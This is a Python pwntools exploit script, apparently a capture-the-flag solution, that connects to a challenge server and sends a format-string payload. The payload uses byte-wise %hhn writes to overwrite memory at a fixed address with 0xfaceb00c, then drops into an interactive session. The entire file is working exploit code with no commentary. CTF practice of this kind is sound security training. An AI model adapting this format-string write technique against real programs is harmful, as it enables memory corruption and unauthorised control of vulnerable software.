#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10134)

def fmt(pre, val, idx):
    if pre < val:
        res = '%{}c'.format(val - pre)
    elif pre == val:
        res = ''
    else:
        res = '%{}c'.format(val - pre + 256)
    res += '%{}$hhn'.format(idx)
    return res

r.recvuntil(':')

payload = ''
target = 0xfaceb00c
addr = 0x60106c
pre = 0

for i in xrange(4):
    payload += fmt(pre, (target >> 8 * i) & 0xff, 22 + i)
    pre = (target >> i * 8) & 0xff
payload = payload.ljust(0x80, 'a') + p64(addr) + p64(addr + 1) + p64(addr + 2) + p64(addr + 3)

r.sendline(payload)

r.interactive()
